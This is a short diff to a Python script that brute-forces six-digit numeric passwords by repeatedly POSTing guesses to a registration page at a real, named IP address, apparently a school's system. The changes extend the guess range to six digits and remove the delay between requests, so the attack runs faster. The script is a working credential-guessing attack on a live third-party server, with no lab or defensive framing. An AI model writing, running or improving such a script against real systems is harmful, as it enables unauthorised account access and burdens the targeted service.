@@ -27,8 +27,12 @@ while True:
     	spasswd = '00' + str(passwd)
     if len(str(passwd)) == 5:
     	spasswd = '0' + str(passwd)
+    if len(str(passwd)) == 6:
+    	spasswd = str(passwd)
     if passwd > 1000000:
+    	print('fuck failed')
     	break
+    
     r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
     'SCH_NO':'',
     'Time':'',
@@ -54,4 +58,3 @@ while True:
     	file.close()
     	passwd += 1
     	print(spasswd)
-    	time.sleep(0.0000003)
